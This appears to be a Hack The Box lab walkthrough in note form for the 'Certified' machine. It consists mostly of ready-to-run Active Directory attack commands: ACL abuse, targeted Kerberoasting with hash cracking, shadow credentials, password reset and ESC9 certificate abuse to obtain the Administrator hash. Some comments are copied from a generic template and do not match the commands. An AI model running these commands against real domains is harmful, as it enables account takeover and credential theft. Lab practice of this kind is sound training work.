# Judith *WriteOwner* on `Management Group`
1. Set himself as the owner of the group.
2. Modify the group’s permissions to grant himself `WriteDACL` (allowing him to modify memberships).
3. Add himself to the group (gaining privileges associated with it).
```bash
# Grant full ownership to Judith
impacket-owneredit -action write -new-owner 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' 'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41

# Grant full control to Judith
impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB'  'certified.htb'/'judith.mader':'judith09' -dc-ip 10.10.11.41

# Add user Judith to Management Group
net rpc group addmem "Management" 'judith.mader' -U 'certified.htb'/'judith.mader'%'judith09' -S 10.10.11.41

```

# Management Group ***GenericWrite*** `management_svc`
## Targeted Kerberoast
judith is now a part of `management group`
```bash
# GenericWrite using targetedKerberoast.py
python3 /opt/targetedKerberoast/targetedKerberoast.py -d certified.htb -u 'judith.mader' -p 'judith09' -v

```
*got `management_svc` hash*
```powershell
.\hashcat.exe -m 13100 ..\hashes\HackTheBox\certified_management_svc.txt ..\rockyou.txt
```
## ✅method 2 - Shadow Credential Attack w/ `pywhisker.py` and `certipy-ad`
```bash
python3 /opt/pywhisker/pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add" --filename 'management_svc'

certipy-ad cert -pfx management_svc.pfx -password 'raXIjyGKB1tsZlVrjkeB' -export -out 'mgmt_svc_dec.pfx'

certipy-ad auth -pfx mgmt_svc_dec.pfx -username 'management_svc' -domain 'certified.htb' -dc-ip 10.10.11.41
```
## ✅ method 3 - Shadow Credential Attack w/ `certipy-ad`
```bash
certipy-ad shadow auto -username 'judith.mader@certified.htb' -p 'judith09' -account 'management_svc'
```


# management_svc ***GenericAll*** ca_operator

```bash
# change password on evil-winRM
Evil-WinRM> net user ca_operator Password123
```


# Exploit ESC9
`management_svc` has ***GenericWrite*** (actually GenericAll) over `ca_operator`
`john` has ***GenericWrite*** over `jane`
```bash
# change the userPrincipalName of ca_operator to be Administrator
certipy-ad account update -username 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user 'ca_operator' -upn 'administrator'

# request the certificate as ca_operator
certipy-ad req -username 'ca_operator@certified.htb' -password 'Password123' -ca 'certified-DC01-CA' -template 'CertifiedAuthentication'

# change back the userPrincipalName of Jane to be something else, like her original userPrincipalName Jane@corp.local
certipy-ad account update -username 'management_svc@certified.htb' -hashes 'a091c1832bcdd4677c28b5a6a1295584' -user 'ca_operator' -upn 'ca_operator@certified.htb'

# try to authenticate with the certificate, we will receive the NT hash of the Administrator@corp.local user
certipy-ad auth -pfx administrator.pfx -domain 'certified.htb'

```